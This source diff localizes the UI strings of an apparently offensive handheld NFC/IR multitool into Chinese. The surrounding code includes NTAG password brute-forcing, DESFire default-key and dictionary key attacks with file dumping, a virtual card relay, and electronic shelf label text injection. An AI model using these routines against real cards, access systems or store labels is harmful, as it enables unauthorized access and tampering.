-                    sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(4, 55); sp.print("ESP-NOW init fail"); if (use_sprite) sprite->pushSprite(0,0); delay(1500);
+                    sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(4, 55); sp.print("ESP-NOW 初始化失败"); if (use_sprite) sprite->pushSprite(0,0); delay(1500);
                 } else {
                     uint8_t ident[80]; int ii = 0;                          // synthetic ISO-DEP identity for unit B
                     static const uint8_t vuid[7] = {0x04, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
@@ -51889,14 +52186,14 @@ void nfcMenu() {
                             Serial.printf("[VCARD] REQ seq=%d len=%d -> CAFE9000\n", seq, rly_req_len);
                         }
                         sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
-                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("VirtCard A (noHAT)");
-                        sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 22); sp.print("Synthetic 4A card");
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("虚拟卡 A (无模块)");
+                        sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 22); sp.print("模拟 4A 卡片");
                         sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 38); sp.print("UID 04112233445566");
-                        sp.setCursor(4, 52); sp.print("Reply: CA FE 90 00");
-                        sp.setCursor(4, 68); sp.printf("APDUs served: %d", served);
-                        sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 84); sp.print("Last REQ:");
-                        sp.setCursor(4, 96); sp.print(lastreq[0] ? lastreq : "(waiting B)");
-                        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                        sp.setCursor(4, 52); sp.print("应答: CA FE 90 00");
+                        sp.setCursor(4, 68); sp.printf("已处理 APDU: %d", served);
+                        sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 84); sp.print("最近请求:");
+                        sp.setCursor(4, 96); sp.print(lastreq[0] ? lastreq : "(等待端 B)");
+                        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=停止");
                         if (use_sprite) sprite->pushSprite(0, 0);
                         M5.update(); cardUpdate();
                         if (kp(KEY_BACKSPACE)) { keyRelease(); run = false; }
@@ -51917,9 +52214,9 @@ void nfcMenu() {
                 sp.fillRect(0, 0, W, 14, 0x0841);
                 sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("UL / NTAG");
                 sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                sp.setCursor(20, 55); sp.print("Place tag on reader...");
+                sp.setCursor(20, 55); sp.print("请将标签放在读卡器上...");
                 sp.fillRect(0, H-14, W, 14, 0x0841);
-                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=菜单");
                 if (use_sprite) sprite->pushSprite(0, 0);
 
                 NfcCardInfo card = {};
@@ -51969,16 +52266,16 @@ void nfcMenu() {
                         for (int i = 0; i < card.uid_len && i < 7; i++) sp.printf(" %02X", card.uid[i]);
                         sp.setTextColor(TFT_CYAN, TFT_BLACK);
                         sp.setCursor(2, 29);
-                        sp.printf("Pg %d/%d rd=%d", ut.total, ut.total, read_ok);
-                        if (has_cnt) sp.printf(" cnt=%02X%02X%02X", cnt3[2], cnt3[1], cnt3[0]);
+                        sp.printf("页 %d/%d 已读=%d", ut.total, ut.total, read_ok);
+                        if (has_cnt) sp.printf(" 计数=%02X%02X%02X", cnt3[2], cnt3[1], cnt3[0]);
                         sp.setCursor(2, 41);
                         sp.setTextColor(has_sig ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
-                        sp.printf("Sig:%s", has_sig ? "yes" : "no");
+                        sp.printf("签名:%s", has_sig ? "有" : "无");
                         sp.setTextColor(first_locked >= 0 ? TFT_ORANGE : TFT_DARKGREY, TFT_BLACK);
-                        if (first_locked >= 0) sp.printf("  locked@p%d", first_locked);
-                        else sp.print("  all readable");
+                        if (first_locked >= 0) sp.printf("  锁定@页%d", first_locked);
+                        else sp.print("  全部可读");
                         // hex page list (4 pages visible)
-                        sp.setTextFont(1); sp.setTextSize(1);
+                        evilKeepCnFont(sp); evilSetCnFont(sp, 1);
                         int y = 54;
                         for (int i = 0; i < 4 && (page_view + i) < ut.total; i++) {
                             int pg = page_view + i;
@@ -51990,7 +52287,7 @@ void nfcMenu() {
                         }
                         sp.fillRect(0, H-14, W, 14, 0x0841);
                         sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H-12);
-                        sp.print(refresh_hint ? "S=save P=pwd ;/.pg BACK" : "S=save P=pwd ;/.pg BACK");
+                        sp.print(refresh_hint ? "S=保存 P=破密 ;/.翻页 BACK" : "S=保存 P=破密 ;/.翻页 BACK");
                         if (use_sprite) sprite->pushSprite(0, 0);
                         need_draw = false;
                     }
@@ -52032,7 +52329,7 @@ void nfcMenu() {
                         }
                         sp.fillRect(0, H-26, W, 12, TFT_BLACK);
                         sp.setTextColor(ok ? TFT_GREEN : TFT_RED, TFT_BLACK);
-                        sp.setCursor(2, H-25); sp.print(ok ? fn : "SD save failed");
+                        sp.setCursor(2, H-25); sp.print(ok ? fn : "SD卡保存失败");
                         if (use_sprite) sprite->pushSprite(0, 0);
                         delay(1200); need_draw = true;
                     }
@@ -52062,7 +52359,7 @@ void nfcMenu() {
                                 if ((tried & 0x0F) == 0) {
                                     sp.fillRect(0, 41, W, 12, TFT_BLACK);
                                     sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                                    sp.setCursor(2, 41); sp.printf("PWD BF... tried %ld", tried);
+                                    sp.setCursor(2, 41); sp.printf("密码爆破中... 已试 %ld", tried);
                                     if (use_sprite) sprite->pushSprite(0, 0);
                                     M5.update(); cardUpdate();
                                     if (kp(KEY_BACKSPACE)) { keyRelease(); cancel = true; }
@@ -52073,10 +52370,10 @@ void nfcMenu() {
                         sp.fillRect(0, 41, W, 12, TFT_BLACK);
                         if (hit) {
                             sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(2, 41);
-                            sp.printf("PWD %02X%02X%02X%02X PACK %02X%02X", found[0], found[1], found[2], found[3], pack[0], pack[1]);
+                            sp.printf("密码 %02X%02X%02X%02X PACK %02X%02X", found[0], found[1], found[2], found[3], pack[0], pack[1]);
                         } else {
                             sp.setTextColor(cancel ? TFT_ORANGE : TFT_RED, TFT_BLACK); sp.setCursor(2, 41);
-                            sp.printf(cancel ? "PWD BF cancelled (%ld)" : "PWD not found (%ld)", tried);
+                            sp.printf(cancel ? "爆破已取消 (%ld)" : "未找到密码 (%ld)", tried);
                         }
                         if (use_sprite) sprite->pushSprite(0, 0);
                         delay(1600);
@@ -52099,8 +52396,8 @@ void nfcMenu() {
                     rescan = false;
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("ISO-V/F/B Scan");
-                    sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(6, 22); sp.print("Polling B / F / V...");
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("ISO-V/F/B 扫描");
+                    sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(6, 22); sp.print("正在轮询 B / F / V...");
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     // ISO14443-B (REQB)
@@ -52115,21 +52412,21 @@ void nfcMenu() {
 
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("ISO-V/F/B Scan");
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("ISO-V/F/B 扫描");
                     int y = 20;
                     // ISO-B
                     sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, y); sp.print("ISO-B:");
                     sp.setTextColor(rb == NFCV_FOUND ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
                     sp.setCursor(58, y);
                     if (rb == NFCV_FOUND) { sp.print("PUPI "); for (int i=0;i<4;i++) sp.printf("%02X", pupi[i]); }
-                    else sp.print("none");
+                    else sp.print("无");
                     y += 16;
                     // FeliCa
                     sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, y); sp.print("FeliCa:");
                     sp.setTextColor(rf == NFCV_FOUND ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
                     sp.setCursor(58, y);
                     if (rf == NFCV_FOUND) { sp.print("IDm "); for (int i=0;i<8;i++) sp.printf("%02X", idm[i]); }
-                    else sp.print("none");
+                    else sp.print("无");
                     y += 16;
                     if (rf == NFCV_FOUND) {
                         sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(58, y); sp.print("PMm ");
@@ -52140,11 +52437,11 @@ void nfcMenu() {
                     sp.setTextColor(rv == NFCV_FOUND ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
                     sp.setCursor(58, y);
                     if (rv == NFCV_FOUND) { sp.print("UID "); for (int i = 0; i < 8; i++) sp.printf("%02X", vuid[i]); }
-                    else sp.print("none");
+                    else sp.print("无");
                     y += 16;
 
                     sp.fillRect(0, H-14, W, 14, 0x0841);
-                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("ENT=rescan BACK=menu");
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("ENT=重扫 BACK=菜单");
                     if (use_sprite) sprite->pushSprite(0, 0);
 
                     // Belt-and-suspenders: full re-init of the NFC-A reader.
@@ -52163,9 +52460,9 @@ void nfcMenu() {
             sp.fillRect(0, 0, W, 14, 0x0841);
             sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("DESFire");
             sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-            sp.setCursor(20, 55); sp.print("Approche une carte...");
+            sp.setCursor(20, 55); sp.print("请靠近卡片...");
             sp.fillRect(0, H-14, W, 14, 0x0841);
-            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=菜单");
             if (use_sprite) sprite->pushSprite(0, 0);
 
             std::vector<String> lines;
@@ -52186,25 +52483,25 @@ void nfcMenu() {
                 // GET_VERSION
                 uint8_t ver[32]; int vl = df_get_version(ver);
                 if (vl < 7) {   // pas DESFire (ou pas de réponse native)
-                    lines.push_back("Pas une DESFire ?");
-                    lines.push_back("GET_VERSION KO");
+                    lines.push_back("非 DESFire 卡?");
+                    lines.push_back("GET_VERSION 失败");
                     got = true; break;
                 }
                 got = true;
 
                 char b[48];
                 lines.push_back(String("== DESFire =="));
-                snprintf(b, sizeof(b), "HW v%d.%d proto %02X", ver[3], ver[4], ver[6]);
+                snprintf(b, sizeof(b), "硬件 v%d.%d 协议 %02X", ver[3], ver[4], ver[6]);
                 lines.push_back(b);
                 { int code = ver[5]; int approx = 1 << (code >> 1);
-                  snprintf(b, sizeof(b), "Storage ~%dB (%02X)", approx, code); lines.push_back(b); }
+                  snprintf(b, sizeof(b), "容量 ~%dB (%02X)", approx, code); lines.push_back(b); }
                 if (vl >= 21) {
                     String uid = "UID ";
                     for (int i = 14; i < 21; i++) { snprintf(b, sizeof(b), "%02X", ver[i]); uid += b; }
                     lines.push_back(uid);
                 }
                 if (vl >= 28) {
-                    snprintf(b, sizeof(b), "Prod semaine %02X/%02X", ver[26], ver[27]);
+                    snprintf(b, sizeof(b), "生产周 %02X/%02X", ver[26], ver[27]);
                     lines.push_back(b);
                 }
 
@@ -52214,14 +52511,14 @@ void nfcMenu() {
                 { uint8_t ks[8]; int ksl = 0;
                   int st = df_cmd(DF_CMD_GET_KEY_SETTINGS, NULL, 0, ks, &ksl, 200);
                   if (st == DF_ST_OK && ksl >= 2) {
-                      snprintf(b, sizeof(b), "PICC keyset %02X nk=%d", ks[0], ks[1] & 0x0F);
+                      snprintf(b, sizeof(b), "PICC 密钥设置 %02X 数量=%d", ks[0], ks[1] & 0x0F);
                       lines.push_back(b);
                   } }
                 bool m_aes = df_auth_aes(0, DF_KEY_ZERO16, NULL);
                 bool m_des = false;
                 if (!m_aes) { df_select_app(aid0); m_des = df_auth_des(0, DF_KEY_ZERO8, 8); }
-                lines.push_back(String("PICC key0 zero: ") +
-                                (m_aes ? "AES OK" : (m_des ? "DES OK" : "non")));
+                lines.push_back(String("PICC 密钥0全零: ") +
+                                (m_aes ? "AES 成功" : (m_des ? "DES 成功" : "否")));
 
                 // Dictionnaire SD /evil/nfc/desfire_keys.txt (AES) sur PICC key0
                 if (!m_aes) {
@@ -52238,36 +52535,36 @@ void nfcMenu() {
                             df_select_app(aid0);
                             if (df_auth_aes(0, key, NULL)) {
                                 m_aes = true;
-                                lines.push_back(String("PICC key0 DICT AES OK (#") + tried + ")");
+                                lines.push_back(String("PICC 密钥0 字典AES成功 (#") + tried + ")");
                             }
                         }
                         kf.close();
-                        if (!m_aes) lines.push_back(String("Dict AES: ") + tried + " essais, non");
+                        if (!m_aes) lines.push_back(String("字典AES: 尝试 ") + tried + " 次, 失败");
                     }
                 }
 
                 // Applications
                 uint8_t aids[3*28]; int napp = df_get_app_ids(aids, sizeof(aids));
-                if (napp < 0) { lines.push_back("GET_APP_IDS KO"); }
+                if (napp < 0) { lines.push_back("GET_APP_IDS 失败"); }
                 else {
-                    snprintf(b, sizeof(b), "-- %d application(s) --", napp);
+                    snprintf(b, sizeof(b), "-- %d 个应用 --", napp);
                     lines.push_back(b);
                     for (int a = 0; a < napp && a < 12; a++) {
                         uint8_t* aid = aids + a*3;
                         snprintf(b, sizeof(b), "AID %02X%02X%02X", aid[2], aid[1], aid[0]);
                         lines.push_back(b);
-                        if (df_select_app(aid) != DF_ST_OK) { lines.push_back("  select KO"); continue; }
+                        if (df_select_app(aid) != DF_ST_OK) { lines.push_back("  选择失败"); continue; }
                         // auth zero key sur cette app (key0)
                         bool a_aes = df_auth_aes(0, DF_KEY_ZERO16, NULL);
-                        if (a_aes) lines.push_back("  key0 zero: AES OK");
+                        if (a_aes) lines.push_back("  密钥0全零: AES 成功");
                         df_select_app(aid);
                         uint8_t fids[32]; int nf = df_get_file_ids(fids, sizeof(fids));
-                        if (nf < 0) { lines.push_back("  GetFileIDs KO"); continue; }
-                        snprintf(b, sizeof(b), "  %d fichier(s)", nf); lines.push_back(b);
+                        if (nf < 0) { lines.push_back("  获取文件ID失败"); continue; }
+                        snprintf(b, sizeof(b), "  %d 个文件", nf); lines.push_back(b);
                         for (int f = 0; f < nf && f < 16; f++) {
                             uint8_t fs[24]; int fsl = df_get_file_settings(fids[f], fs, sizeof(fs));
                             if (fsl >= 2) {
-                                snprintf(b, sizeof(b), "  f%02X type%d cm%d", fids[f], fs[0], fs[1] & 3);
+                                snprintf(b, sizeof(b), "  f%02X 类型%d 通信%d", fids[f], fs[0], fs[1] & 3);
                                 lines.push_back(b);
                                 // Lecture du CONTENU selon le type (droits permettant ; sinon "denied")
                                 uint8_t fdata[32];
@@ -52279,21 +52576,21 @@ void nfcMenu() {
                                         int pos = snprintf(b, sizeof(b), "   =");
                                         for (int k = 0; k < rd && k < 10; k++) pos += snprintf(b + pos, sizeof(b) - pos, "%02X", fdata[k]);
                                         lines.push_back(b);
-                                    } else lines.push_back("   (read denied)");
+                                    } else lines.push_back("   (读取被拒)");
                                 } else if (fs[0] == 2) {                 // value
                                     int32_t v;
-                                    if (df_get_value(fids[f], &v) == 0) { snprintf(b, sizeof(b), "   value=%ld", (long)v); lines.push_back(b); }
-                                    else lines.push_back("   (value denied)");
+                                    if (df_get_value(fids[f], &v) == 0) { snprintf(b, sizeof(b), "   数值=%ld", (long)v); lines.push_back(b); }
+                                    else lines.push_back("   (数值被拒)");
                                 } else if (fs[0] == 3 || fs[0] == 4) {   // record linear/cyclic
                                     int rd = df_read_records(fids[f], 0, 1, fdata, sizeof(fdata));
                                     if (rd > 0) {
-                                        int pos = snprintf(b, sizeof(b), "   rec=");
+                                        int pos = snprintf(b, sizeof(b), "   记录=");
                                         for (int k = 0; k < rd && k < 10; k++) pos += snprintf(b + pos, sizeof(b) - pos, "%02X", fdata[k]);
                                         lines.push_back(b);
-                                    } else lines.push_back("   (rec denied)");
+                                    } else lines.push_back("   (记录被拒)");
                                 }
                             } else {
-                                snprintf(b, sizeof(b), "  f%02X (settings KO)", fids[f]);
+                                snprintf(b, sizeof(b), "  f%02X (设置读取失败)", fids[f]);
                                 lines.push_back(b);
                             }
                         }
@@ -52317,7 +52614,7 @@ void nfcMenu() {
                         draw = false;
                         sp.fillScreen(TFT_BLACK);
                         sp.fillRect(0, 0, W, 14, 0x0841);
-                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("DESFire dump");
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("DESFire 转储");
                         sp.setTextColor(TFT_GREEN, TFT_BLACK);
                         for (int i = 0; i < vis && top + i < (int)lines.size(); i++) {
                             sp.setCursor(2, listY + i*lineH);
@@ -52325,7 +52622,7 @@ void nfcMenu() {
                         }
                         sp.fillRect(0, H-14, W, 14, 0x0841);
                         sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                        sp.print(";/. scroll  BACK=menu");
+                        sp.print(";/. 滚动  BACK=菜单");
                         if (use_sprite) sprite->pushSprite(0, 0);
                     }
                     delay(4);
@@ -53451,7 +53748,7 @@ uint8_t tt_font_idx = 0;
 
 void tt_apply_font(M5Canvas& canvas, uint8_t fontIdx, uint8_t textSize) {
     switch (fontIdx) {
-        case 0: canvas.setTextFont(1); canvas.setTextSize(textSize); break;
+        case 0: evilSetCnFont(canvas, textSize); break;
         case 1: canvas.setFreeFont(&FreeSans9pt7b); canvas.setTextSize(1); break;
         case 2: canvas.setFreeFont(&FreeSans12pt7b); canvas.setTextSize(1); break;
         case 3: canvas.setFreeFont(&FreeSans18pt7b); canvas.setTextSize(1); break;
@@ -53674,41 +53971,41 @@ volatile int tt_tx_total = 0;
 void tt_draw_tx_screen(const char* title, int spinIdx, unsigned long elapsed) {
     const char* spinner = "|/-\\";
     M5.Display.clear();
-    M5.Display.setTextFont(1);
+    evilKeepCnFont(M5.Display);
 
     M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 3);
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.print(title);
 
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_GREEN);
     M5.Display.setCursor(10, 30);
-    M5.Display.printf("%c  IR LED active", spinner[spinIdx % 4]);
+    M5.Display.printf("%c  红外发射中", spinner[spinIdx % 4]);
 
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.setCursor(10, 50);
-    M5.Display.printf("Mode: %s", tt_use_pp16 ? "PP16" : "PP4");
+    M5.Display.printf("模式: %s", tt_use_pp16 ? "PP16" : "PP4");
     M5.Display.setCursor(10, 65);
-    M5.Display.printf("Time: %lus", elapsed);
+    M5.Display.printf("用时: %lus", elapsed);
 
     if (tt_tx_total > 0) {
         int pct = ((tt_tx_progress + 1) * 100) / tt_tx_total;
         M5.Display.setCursor(10, 80);
-        M5.Display.printf("Frame %d/%d  %d%%", tt_tx_progress + 1, tt_tx_total, pct);
+        M5.Display.printf("帧 %d/%d  %d%%", tt_tx_progress + 1, tt_tx_total, pct);
         int barX = 10, barY = 98, barW = 180, barH = 10;
         int filled = ((tt_tx_progress + 1) * barW) / tt_tx_total;
         M5.Display.drawRect(barX, barY, barW, barH, TFT_WHITE);
         if (filled > 2) M5.Display.fillRect(barX + 1, barY + 1, filled - 2, barH - 2, TFT_GREEN);
     } else {
         M5.Display.setCursor(10, 80);
-        M5.Display.print("Repeats: continuous");
+        M5.Display.print("重复: 持续发射");
     }
 
     M5.Display.setCursor(10, 122);
     M5.Display.setTextColor(TFT_ORANGE);
-    M5.Display.print("[BACK] Stop");
+    M5.Display.print("[BACK] 停止");
     M5.Display.display();
 }
 
@@ -53872,21 +54169,21 @@ bool tt_stream_image(const uint8_t* plid, const uint8_t* pixels,
 
 void tt_draw_barcode_ui(const String& input) {
     M5.Display.clear();
-    M5.Display.setTextFont(1);
+    evilKeepCnFont(M5.Display);
 
     M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 3);
     M5.Display.setTextColor(TFT_WHITE);
-    M5.Display.print("ESL Barcode Input");
+    M5.Display.print("ESL 条码输入");
 
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_LIGHTGREY);
     M5.Display.setCursor(10, 25);
-    M5.Display.print("Enter 17-char barcode");
+    M5.Display.print("请输入17位条码");
 
     M5.Display.setCursor(10, 45);
-    M5.Display.setTextSize(2);
+    evilSetCnFont(M5.Display, 2);
     for (int i = 0; i < TT_BC_LEN; i++) {
         if (i < (int)input.length()) {
             M5.Display.setTextColor(i < 2 ? TFT_CYAN : TFT_GREEN);
@@ -53900,34 +54197,34 @@ void tt_draw_barcode_ui(const String& input) {
         }
     }
 
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(10, 70);
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.printf("(%d / %d)", input.length(), TT_BC_LEN);
     if (input.length() < 2) {
         M5.Display.setTextColor(TFT_YELLOW);
-        M5.Display.print("  prefix (letters ok)");
+        M5.Display.print("  前缀(可输字母)");
     } else {
         M5.Display.setTextColor(TFT_LIGHTGREY);
-        M5.Display.print("  digits only");
+        M5.Display.print("  仅限数字");
     }
 
     if (tt_last_barcode.length() == TT_BC_LEN) {
         M5.Display.setCursor(10, 85);
         M5.Display.setTextColor(TFT_DARKGREY);
-        M5.Display.printf("Last: %s", tt_last_barcode.c_str());
+        M5.Display.printf("上次: %s", tt_last_barcode.c_str());
         M5.Display.setCursor(10, 98);
         M5.Display.setTextColor(TFT_CYAN);
-        M5.Display.print("ENTER=reuse  S=save tag");
+        M5.Display.print("ENTER=复用  S=保存标签");
     } else if (input.length() == TT_BC_LEN) {
         M5.Display.setCursor(10, 98);
         M5.Display.setTextColor(TFT_CYAN);
-        M5.Display.print("ENTER=go  S=save tag");
+        M5.Display.print("ENTER=确认  S=保存标签");
     }
 
     M5.Display.setCursor(10, 122);
     M5.Display.setTextColor(TFT_ORANGE);
-    M5.Display.print("[BACK] Cancel");
+    M5.Display.print("[BACK] 取消");
     M5.Display.display();
 }
 
@@ -53959,12 +54256,12 @@ String tt_get_barcode() {
                 TtTagProfile prof;
                 tt_barcode_to_profile(bc.c_str(), &prof);
                 String defName = prof.model_name ? String(prof.model_name) : "";
-                String name = tt_get_text_input("Tag name", true);
+                String name = tt_get_text_input("标签名称", true);
                 if (name.length() == 0) name = defName.length() > 0 ? defName : bc;
                 if (tt_target_add(bc.c_str(), name.c_str()))
-                    tt_show_success("Tag saved!");
+                    tt_show_success("标签已保存!");
                 else
-                    tt_show_error("Max tags reached");
+                    tt_show_error("标签数量已满");
                 tt_draw_barcode_ui(input);
             }
             delay(150);
@@ -54016,20 +54313,20 @@ String tt_get_barcode() {
 
 void tt_show_msg(const char* title, const char* msg, uint16_t barColor, uint16_t textColor) {
     M5.Display.clear();
-    M5.Display.setTextFont(1);
+    evilKeepCnFont(M5.Display);
     M5.Display.fillRect(0, 0, 240, 18, barColor);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 3);
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.print(title);
-    M5.Display.setTextSize(2);
+    evilSetCnFont(M5.Display, 2);
     M5.Display.setCursor(10, 50);
     M5.Display.setTextColor(textColor);
     M5.Display.print(msg);
     M5.Display.setCursor(10, 122);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_DARKGREY);
-    M5.Display.print("[BACK] OK");
+    M5.Display.print("[BACK] 确定");
     M5.Display.display();
     delay(200);
     while (true) {
@@ -54040,19 +54337,19 @@ void tt_show_msg(const char* title, const char* msg, uint16_t barColor, uint16_t
     delay(150);
 }
 
-void tt_show_error(const char* msg) { tt_show_msg("Error", msg, 0x8000, TFT_ORANGE); }
-void tt_show_success(const char* msg) { tt_show_msg("Success", msg, 0x03E0, TFT_GREEN); }
+void tt_show_error(const char* msg) { tt_show_msg("错误", msg, 0x8000, TFT_ORANGE); }
+void tt_show_success(const char* msg) { tt_show_msg("成功", msg, 0x03E0, TFT_GREEN); }
 
 void tt_draw_text_input(const char* title, const String& input, int cursorPos) {
     M5.Display.clear();
-    M5.Display.setTextFont(1);
+    evilKeepCnFont(M5.Display);
     M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 3);
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.print(title);
 
-    M5.Display.setTextSize(2);
+    evilSetCnFont(M5.Display, 2);
     M5.Display.setCursor(5, 30);
     M5.Display.setTextColor(TFT_GREEN);
     String visible = input;
@@ -54063,17 +54360,17 @@ void tt_draw_text_input(const char* title, const String& input, int cursorPos) {
         M5.Display.print("_");
     }
 
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 55);
     M5.Display.setTextColor(TFT_LIGHTGREY);
-    M5.Display.printf("%d chars", input.length());
+    M5.Display.printf("%d 字符", input.length());
 
     M5.Display.setCursor(5, 110);
     M5.Display.setTextColor(TFT_CYAN);
-    M5.Display.print("ENTER=OK");
+    M5.Display.print("ENTER=确认");
     M5.Display.setCursor(120, 110);
     M5.Display.setTextColor(TFT_ORANGE);
-    M5.Display.print("BACK=Cancel");
+    M5.Display.print("BACK=取消");
     M5.Display.display();
 }
 
@@ -54146,9 +54443,9 @@ TtMenuItem ttItem(std::function<String()> l, std::function<void()> a, bool act) 
 
 void tt_menu_draw(std::vector<TtMenuItem>& items, const char* title, int sel, int scroll) {
     M5.Display.fillScreen(TFT_BLACK);
-    M5.Display.setTextFont(1);
+    evilKeepCnFont(M5.Display);
     M5.Display.fillRect(0, 0, 240, 18, TFT_NAVY);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 3);
     M5.Display.setTextColor(TFT_GREEN);
     M5.Display.print(title);
@@ -54162,7 +54459,7 @@ void tt_menu_draw(std::vector<TtMenuItem>& items, const char* title, int sel, in
         } else {
             M5.Display.setTextColor(TFT_WHITE);
         }
-        M5.Display.setTextSize(1.5);
+        evilSetCnFont(M5.Display, 1.5);
         M5.Display.setCursor(isSel ? 8 : 5, y + 2);
         M5.Display.print(items[i].label());
         y += TT_MENU_ROW_H;
@@ -54267,29 +54564,29 @@ void tt_presets_menu() {
         std::vector<String> labels;
         for (uint8_t i = 0; i < tt_preset_count; i++)
             labels.push_back(String(tt_presets[i].name));
-        labels.push_back("+ New Preset");
-        String title = "Presets (" + String(tt_preset_count) + ")";
+        labels.push_back("+ 新建预设");
+        String title = "预设 (" + String(tt_preset_count) + ")";
         int sel = tt_menu_select(labels, title.c_str());
         if (sel < 0) return;
 
         if (sel < tt_preset_count) {
             std::vector<TtMenuItem> acts;
             uint8_t idx = sel;
-            acts.push_back(ttItem([idx](){ return String("Text: ") + tt_presets[idx].text; }, [](){}, false));
-            acts.push_back({[](){ return String("Delete"); }, [&, idx](){
+            acts.push_back(ttItem([idx](){ return String("文本: ") + tt_presets[idx].text; }, [](){}, false));
+            acts.push_back({[](){ return String("删除"); }, [&, idx](){
                 tt_preset_delete(idx);
-                tt_show_success("Deleted");
+                tt_show_success("已删除");
             }, true});
             tt_menu(acts, tt_presets[idx].name);
         } else {
-            String name = tt_get_text_input("Preset name", false);
+            String name = tt_get_text_input("预设名称", false);
             if (name.length() == 0) continue;
-            String text = tt_get_text_input("Preset text", false);
+            String text = tt_get_text_input("预设文本", false);
             if (text.length() == 0) continue;
             if (tt_preset_add(name.c_str(), text.c_str()))
-                tt_show_success("Preset saved!");
+                tt_show_success("预设已保存!");
             else
-                tt_show_error("Max presets");
+                tt_show_error("预设数量已满");
         }
     }
 }
@@ -54297,15 +54594,15 @@ void tt_presets_menu() {
 String tt_choose_text() {
     tt_presets_load();
     if (tt_preset_count == 0)
-        return tt_get_text_input("Text for ESL", false);
+        return tt_get_text_input("输入 ESL 文本", false);
 
     std::vector<String> opts;
-    opts.push_back("New text...");
+    opts.push_back("新建文本...");
     for (uint8_t i = 0; i < tt_preset_count; i++)
         opts.push_back(String(tt_presets[i].name));
-    int sel = tt_menu_select(opts, "Choose Text");
+    int sel = tt_menu_select(opts, "选择文本");
     if (sel < 0) return "";
-    if (sel == 0) return tt_get_text_input("Text for ESL", false);
+    if (sel == 0) return tt_get_text_input("输入 ESL 文本", false);
     return String(tt_presets[sel - 1].text);
 }
 
